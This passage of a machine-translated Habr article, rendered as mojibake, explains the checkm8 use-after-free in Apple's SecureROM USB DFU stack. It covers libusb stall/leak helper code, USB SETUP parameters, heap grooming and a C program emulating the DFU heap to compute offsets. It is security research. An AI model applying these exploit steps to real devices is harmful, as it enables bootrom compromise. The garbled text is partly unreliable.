<span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> рдкрд░ рдПрдХ рдЖрд╡рд░рдг рд╣реИред рдЕрдиреБрд░реЛрдз рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп рд╣реБрдИ рдХрд┐рд╕реА рднреА рдЕрдкрд╡рд╛рдж рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд╕рд╛рдеред  <code>libusb1_async_ctrl_transfer</code> - рдЕрддреБрд▓реНрдпрдХрд╛рд▓рд┐рдХ рдХреНрд╡реЗрд░реА рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП <code>libusb_submit_transfer</code> рдлрд╝рдВрдХреНрд╢рди рдХреЛ <code>libusb</code> рд╕реЗ <code>libusb_submit_transfer</code> рдХрд░рддрд╛ рд╣реИред </p><br><p>  рджреЛрдиреЛрдВ рдХреЙрд▓ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд╛рдкрджрдВрдбреЛрдВ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ: </p><br><ul><li>  рдбрд┐рд╡рд╛рдЗрд╕ рдХрд╛ рдЙрджрд╛рд╣рд░рдг </li><li>  <code>SETUP</code> рдкреИрдХреЗрдЬ рдХреЗ рд▓рд┐рдП рдбреЗрдЯрд╛ (рдЙрдирдХрд╛ рд╡рд┐рд╡рд░рдг <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=hi&amp;u=">рдпрд╣рд╛рдВ рд╣реИ</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  рдбреЗрдЯрд╛ рдЖрдХрд╛рд░ ( <code>wLength</code> ) рдпрд╛ <code>Data Stage</code> рд▓рд┐рдП <code>Data Stage</code> </li><li>  рдЯрд╛рдЗрдордЖрдЙрдЯ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ </li></ul><br><p>  рддрд░реНрдХ <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> рдФрд░ <code>wIndex</code> рддреАрдиреЛрдВ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рд╣реИрдВред  рдЙрдирдХрд╛ рдорддрд▓рдм рд╣реИ: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - рдбрд┐рд╡рд╛рдЗрд╕ рд╕реЗ рд╣реЛрд╕реНрдЯ рддрдХ <code>Data Stage</code> рдХреА рджрд┐рд╢рд╛ (рдбрд┐рд╡рд╛рдЗрд╕ рдЯреВ рд╣реЛрд╕реНрдЯ) </li><li>  <code>0bX00XXXXX</code> - рдорд╛рдирдХ рдЕрдиреБрд░реЛрдз рдкреНрд░рдХрд╛рд░ </li><li>  <code>0bXXX00000</code> - рдЕрдиреБрд░реЛрдз рдХреЗ рд░рд┐рд╕реАрд╡рд░ - рдбрд┐рд╡рд╛рдЗрд╕ </li></ul></li><li>  <code>bRequest = 6</code> - рд╡рд░реНрдгрдирдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХреЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ - рд╕реНрдЯреНрд░рд┐рдВрдЧ ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХрд╛ рд╕реВрдЪрдХрд╛рдВрдХ рд╣реИ, 4 рдбрд┐рд╡рд╛рдЗрд╕ рдХреЗ рд╕реАрд░рд┐рдпрд▓ рдирдВрдмрд░ рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕реНрдЯреНрд░рд┐рдВрдЧ <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - рд╕реНрдЯреНрд░рд┐рдВрдЧ рднрд╛рд╖рд╛ рдХреА рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛, рдЗрд╕рдХрд╛ рдорд╛рди рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдорд╣рддреНрд╡рдкреВрд░реНрдг рдирд╣реАрдВ рд╣реИ рдФрд░ рдЗрд╕реЗ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред </li></ul><br><p>  рдЗрди рддреАрди рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рдХреЗ рд▓рд┐рдП, 0x30 рдмрд╛рдЗрдЯреНрд╕ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдВрд░рдЪрдирд╛ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдвреЗрд░ рдкрд░ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд╕рдмрд╕реЗ рджрд┐рд▓рдЪрд╕реНрдк рдХреНрд╖реЗрддреНрд░ <code>callback</code> рдФрд░ <code>next</code> ред </p><br><ul><li>  <code>callback</code> - рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рдкреЙрдЗрдВрдЯрд░ рдЬрд┐рд╕реЗ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рд╣реЛрдиреЗ рдкрд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ред </li><li>  <code>next</code> - рдЙрд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдЕрдЧрд▓реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рдВрдХреЗрддрдХ, рдХрддрд╛рд░рдмрджреНрдз рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХред </li></ul><br><p>  <code>stall</code> рдкрд░ рдХреЙрд▓ рдХрд░рдиреЗ рдХреА рдПрдХ рдкреНрд░рдореБрдЦ рд╡рд┐рд╢реЗрд╖рддрд╛ рдЕрдиреБрд░реЛрдз рдХреЗ рдЕрддреБрд▓реНрдпрдХрд╛рд▓рд┐рдХ рдирд┐рд╖реНрдкрд╛рджрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдиреНрдпреВрдирддрдо рдЯрд╛рдЗрдордЖрдЙрдЯ рдХреЗ рд╕рд╛рде рдХрд░рдирд╛ рд╣реИред  рдЗрд╕рдХреЗ рдХрд╛рд░рдг, рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ, рддреЛ рдЕрдиреБрд░реЛрдз рдУрдПрд╕ рд╕реНрддрд░ рдкрд░ рд░рджреНрдж рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди рдХрддрд╛рд░ рдореЗрдВ рд░рд╣реЗрдЧрд╛, рдФрд░ рд▓реЗрдирджреЗрди рдкреВрд░рд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛ред  рдЗрд╕реА рд╕рдордп, рдбрд┐рд╡рд╛рдЗрд╕ рд╕рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ <code>SETUP</code> рдкреИрдХреЗрдЯ рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЬрд╛рд░реА рд░рдЦреЗрдЧрд╛ рдФрд░ рдпрджрд┐ рдЖрд╡рд╢реНрдпрдХ рд╣реЛ, рддреЛ рдЙрдиреНрд╣реЗрдВ рдирд┐рд╖реНрдкрд╛рджрди рдХрддрд╛рд░ рдореЗрдВ рд░рдЦреЗрдВред  рдмрд╛рдж рдореЗрдВ, <code>Arduino</code> рдкрд░ рдПрдХ <code>USB</code> рд╕рд╛рде рдкреНрд░рдпреЛрдЧреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП <code>Arduino</code> рд╣рдо рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдереЗ рдХрд┐ рд╕рдлрд▓ рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдореЗрдЬрдмрд╛рди рдХреЛ рдПрдХ <code>SETUP</code> рдкреИрдХреЗрдЯ рдФрд░ рдПрдХ <code>IN</code> рдЯреЛрдХрди рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рд▓реЗрди-рджреЗрди рдХреЛ рдЯрд╛рдЗрдордЖрдЙрдЯ рджреНрд╡рд╛рд░рд╛ рд░рджреНрдж рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред  рдпреЛрдЬрдирд╛рдмрджреНрдз рд░реВрдк рд╕реЗ, рдЗрд╕ рддрд░рд╣ рдХреЗ рдЕрдкреВрд░реНрдг рд▓реЗрдирджреЗрди рдХреЛ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  рдмрд╛рдХреА рдЕрдиреБрд░реЛрдз рдХреЗрд╡рд▓ рд▓рдВрдмрд╛рдИ рдореЗрдВ рдФрд░ рдХреЗрд╡рд▓ рдПрдХ рд╕реЗ рднрд┐рдиреНрди рд╣реЛрддреЗ рд╣реИрдВред  рддрдереНрдп рдпрд╣ рд╣реИ рдХрд┐ рдорд╛рдирдХ рдкреНрд░рд╢реНрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдорд╛рдирдХ <code>callback</code> рд╣реИ рдЬреЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  <code>io_length</code> рдорд╛рди рдЕрдиреБрд░реЛрдз рдХреЗ <code>SETUP</code> рдкреИрдХреЗрдЯ рдФрд░ рдЕрдиреБрд░реЛрдзрд┐рдд рд╡рд┐рд╡рд░рдгрдХ рдХреА рдореВрд▓ рд▓рдВрдмрд╛рдИ рдореЗрдВ <code>wLength</code> рдХреА рдиреНрдпреВрдирддрдо рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИред  рдЗрд╕ рддрдереНрдп рдХреЗ рдХрд╛рд░рдг рдХрд┐ рд╡рд┐рд╡рд░рдгрдХ рдХрд╛рдлреА рд▓рдВрдмрд╛ рд╣реИ, рд╣рдо рдЗрд╕рдХреА рд▓рдВрдмрд╛рдИ рдХреЗ рднреАрддрд░ <code>io_length</code> рдорд╛рди рдХреЛ рдареАрдХ рд╕реЗ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред  <code>g_setup_request.wLength</code> рдХрд╛ рдорд╛рди рдкрд┐рдЫрд▓реЗ <code>SETUP</code> рдкреИрдХреЗрдЯ рдХреЗ <code>wLength</code> рдорд╛рди рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, <code>0xC1</code> ред </p><br><p>  рдЗрд╕ рдкреНрд░рдХрд╛рд░, <code>stall</code> рдФрд░ <code>leak</code> рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрддреНрдкрдиреНрди рдХреНрд╡реЗрд░реА рдХреЗ рдкреВрд░рд╛ рд╣реЛрдиреЗ рдкрд░, рдЕрдВрддрд┐рдо <code>callback</code> рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рд╕реНрдерд┐рддрд┐ рд╕рдВрддреБрд╖реНрдЯ рд╣реЛрддреА рд╣реИ, рдФрд░ <code>usb_core_send_zlp()</code> рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред  рдпрд╣ рдХреЙрд▓ рдХреЗрд╡рд▓ рдПрдХ <code>zero-length-packet</code> рдмрдирд╛рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрди рдХрддрд╛рд░ рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИред  рд▓реЗрди-рджреЗрди рдХреЗ рд▓рд┐рдП <code>Status Stage</code> рдореЗрдВ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЖрд╡рд╢реНрдпрдХ рд╣реИред </p><br><p>  рдЕрдиреБрд░реЛрдз <code>usb_core_complete_endpoint_io</code> рдлрд╝рдВрдХреНрд╢рди рдкрд░ рдХреЙрд▓ рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ <code>callback</code> рдХрд╣рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЕрдиреБрд░реЛрдз рдореЗрдореЛрд░реА рдХреЛ рдореБрдХреНрдд рдХрд░рддрд╛ рд╣реИред  рдЙрд╕реА рд╕рдордп, рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рд╣реЛрдиреЗ рдкрд░ рди рдХреЗрд╡рд▓ рддрдм рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рд╕рдВрдкреВрд░реНрдг рд▓реЗрдирджреЗрди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдкреВрд░рд╛ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдпрд╣ рднреА рдЬрдм <code>USB</code> рд░реАрд╕реЗрдЯ рд╣реЛред  рдЬреИрд╕реЗ рд╣реА рдПрдХ <code>USB</code> рд░реАрд╕реЗрдЯ рд╕рд┐рдЧреНрдирд▓ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдЕрдиреБрд░реЛрдз рдХрддрд╛рд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрдирдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдкреВрд░рд╛ рд╣реЛ рдЬрд╛рдПрдЧрд╛ред </p><br><p>  рдЪрдпрдирд╛рддреНрдордХ рдХреЙрд▓ <code>usb_core_send_zlp()</code> , рдЕрдиреБрд░реЛрдз рдХрддрд╛рд░ рдХреЛ рджрд░рдХрд┐рдирд╛рд░ рдХрд░рдХреЗ рдФрд░ рдлрд┐рд░ рдЙрдиреНрд╣реЗрдВ рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг, рдЖрдк <code>use-after-free</code> рд╕рдВрдЪрд╛рд▓рди рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдвреЗрд░ рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред  рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо рд░рд┐рд▓реАрдЬрд╝ рдЪрдХреНрд░ рдХреЛ рд╕реНрд╡рдпрдВ рджреЗрдЦреЗрдВ: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  рдЕрдиреБрд░реЛрдз рдХрддрд╛рд░ рдХреЛ рдкрд╣рд▓реЗ рд╕рд╛рдлрд╝ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд┐рд░ рд░рджреНрдж рдХрд┐рдП <code>usb_core_complete_endpoint_io</code> рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ <code>usb_core_complete_endpoint_io</code> , рдФрд░ рдЙрдиреНрд╣реЗрдВ <code>usb_core_complete_endpoint_io</code> рдХреЙрд▓ рдХрд░рдХреЗ рдкреВрд░рд╛ рдХрд┐рдпрд╛ <code>usb_core_complete_endpoint_io</code> ред  рдЙрд╕реА рд╕рдордп, <code>usb_core_send_zlp</code> рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪрдпрдирд┐рдд рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ <code>ep-&gt;io_head</code> рдореЗрдВ рд░рдЦрд╛ рдЧрдпрд╛ рд╣реИред  <code>USB</code> рд░реАрд╕реЗрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкреВрд░реА рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рд╕рдорд╛рдкрди рдмрд┐рдВрджреБ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕рднреА рдЬрд╛рдирдХрд╛рд░реА рд░реАрд╕реЗрдЯ рд╣реЛ рдЬрд╛рдПрдЧреА, рдЬрд┐рд╕рдореЗрдВ <code>io_head</code> рдФрд░ <code>io_tail</code> , рдФрд░ рд╢реВрдиреНрдп-рд▓рдВрдмрд╛рдИ рдЕрдиреБрд░реЛрдз рдвреЗрд░ рдкрд░ рд░рд╣реЗрдЧрд╛ред  рддреЛ рдЖрдк рдмрд╛рдХреА рдвреЗрд░ рдХреЗ рдмреАрдЪ рдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред  рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЖрд░реЗрдЦ рд╕реЗ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рд╣реЛрддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  <code>SecureROM</code> рдореЗрдВ рдвреЗрд░ рдХреЛ рдЗрд╕ рддрд░рд╣ <code>SecureROM</code> рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдПрдХ рдирдП рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдХреЛ рд╕рдмрд╕реЗ рдЫреЛрдЯреЗ рдЖрдХрд╛рд░ рдХреЗ рдЙрдкрдпреБрдХреНрдд рдлреНрд░реА рдЪрдВрдХ рд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред  рдКрдкрд░ рд╡рд░реНрдгрд┐рдд рд╡рд┐рдзрд┐ рджреНрд╡рд╛рд░рд╛ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рдореБрдлреНрдд рд╣рд┐рд╕реНрд╕рд╛ рдмрдирд╛рдХрд░, рдЖрдк <code>USB</code> рдЖрд░рдВрднреАрдХрд░рдг рдХреЗ рджреМрд░рд╛рди рдореЗрдореЛрд░реА рдХреЗ рдЖрд╡рдВрдЯрди рдФрд░ <code>io_buffer</code> рдХреЗ рдЖрд╡рдВрдЯрди рдФрд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред </p><br><p>  рдмреЗрд╣рддрд░ рд╕рдордЭ рдХреЗ рд▓рд┐рдП, <code>DFU</code> рдЗрдирд┐рд╢рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдпрд╣ рдЬрд╛рдирдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ рдХреМрди рд╕реЗ рдвреЗрд░ рдЕрдиреБрд░реЛрдз рд╣реИрдВред  <code>iBoot</code> рд╕реНрд░реЛрдд рдХреЛрдб рдФрд░ <code>iBoot</code> рд░рд┐рд╡рд░реНрд╕ рдЗрдВрдЬреАрдирд┐рдпрд░рд┐рдВрдЧ рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдиреЗ рдХреЗ рдХреНрд░рдо рдореЗрдВ <code>SecureROM</code> рд╣рдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрдХреНрд░рдо рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рдХрд╛рдордпрд╛рдм рд░рд╣реЗ: </p><br><ul><li><ol><li>  рд╡рд┐рднрд┐рдиреНрди рд╕реНрдЯреНрд░рд┐рдВрдЧ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рдХрд╛ рдЖрд╡рдВрдЯрди <br><ul><li>  1.1ред  <code>Nonce</code> (рдЖрдХрд╛рд░ <code>234</code> ) </li><li>  1.2ред  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3ред  <code>Product</code> ( <code>62</code> ) </li><li>  1.4ред  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5ред  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  рдЖрд╡рдВрдЯрди <code>USB</code> рдХреЗ рдХрд╛рд░реНрдп рдХреЗ рдирд┐рд░реНрдорд╛рдг рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝рд╛ рд╣реБрдЖ рд╣реИ <br><ul><li>  2.1ред  рдХрд╛рд░реНрдп рд╕рдВрд░рдЪрдирд╛ ( <code>0x3c0</code> ) </li><li>  2.2ред  рд╕реНрдЯреИрдХ рдЯрд╛рд╕реНрдХ ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>io_buffer</code> ) </li></ol><br></li><li><ol><li>  рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ <br><ul><li>  4.1ред  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2ред  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  рдлрд┐рд░ рдЕрдиреБрд░реЛрдз рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХрд╛ рдПрдХ рдЖрд╡рдВрдЯрди рд╣реИред  рдпрджрд┐ рдвреЗрд░ рд╕реНрдерд╛рди рдХреЗ рдмреАрдЪ рдореЗрдВ рдПрдХ рдЫреЛрдЯрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ, рддреЛ рдкрд╣рд▓реА рд╢реНрд░реЗрдгреА рд╕реЗ рдХреБрдЫ рдЖрд╡рдВрдЯрди рдЗрд╕ рдЪрдВрдХ рдореЗрдВ рдЬрд╛рдПрдВрдЧреЗ, рдФрд░ рдЕрдиреНрдп рд╕рднреА рдЖрд╡рдВрдЯрди рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рд╣реЛ рдЬрд╛рдПрдВрдЧреЗ, рдЬрд┐рд╕рдХреЗ рдХрд╛рд░рдг рд╣рдо рдкреБрд░рд╛рдиреЗ рдмрдлрд░ рдХрд╛ рдЬрд┐рдХреНрд░ рдХрд░рддреЗ рд╣реБрдП <code>usb_device_io_request</code> рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред  рдпреЛрдЬрдирд╛рдмрджреНрдз рд░реВрдк рд╕реЗ, рдЗрд╕реЗ рдирд┐рдореНрдирд╛рдиреБрд╕рд╛рд░ рджрд░реНрд╢рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p>  рдЖрд╡рд╢реНрдпрдХ рдкреВрд░реНрд╡рд╛рдЧреНрд░рд╣ рдХреА рдЧрдгрдирд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдордиреЗ рдмрд╕ рдКрдкрд░ рд╕реВрдЪреАрдмрджреНрдз рдЖрд╡рдВрдЯрди рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХрд╛ рдлреИрд╕рд▓рд╛ рдХрд┐рдпрд╛, <code>iBoot</code> рдХреЗ рд╕реНрд░реЛрдд рдХреЛрдб рдХреЛ рдереЛрдбрд╝рд╛ рд╕рд╛ <code>iBoot</code> ред </p><br><div class="spoiler">  <b class="spoiler_title">DFU рдвреЗрд░ рдЙрддреНрд╕рд░реНрдЬрди</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); //        SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = 